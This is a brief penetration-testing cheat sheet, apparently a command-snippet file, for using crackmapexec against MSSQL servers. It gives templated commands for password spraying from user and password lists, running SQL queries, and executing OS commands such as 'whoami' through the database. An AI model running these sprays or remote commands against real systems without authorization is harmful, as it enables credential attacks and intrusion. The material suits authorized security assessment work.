# cme (MSSQL)

% cme, crackmapexec, Active Directory, nxc, netexec, mssql

## MSSQL password spray
#assessment/AD #attack_type/Bruteforce #port/1433 #protocol/mssql #access/Anonymous 

```bash
cme mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
```

## MSSQL execute query
#assessment/AD #attack_type/Privesc #port/1433 #protocol/mssql #access/Domain_user 

```bash
cme mssql <ip> -u <user> -p <password> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## MSSQL execute command
#assessment/AD #attack_type/Privesc #port/1433 #protocol/mssql #access/Domain_user 

```bash
cme mssql <ip> -u <user> -p <password> --local-auth -x <cmd|whoami>
```

= ip: 192.168.1.0/24
= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
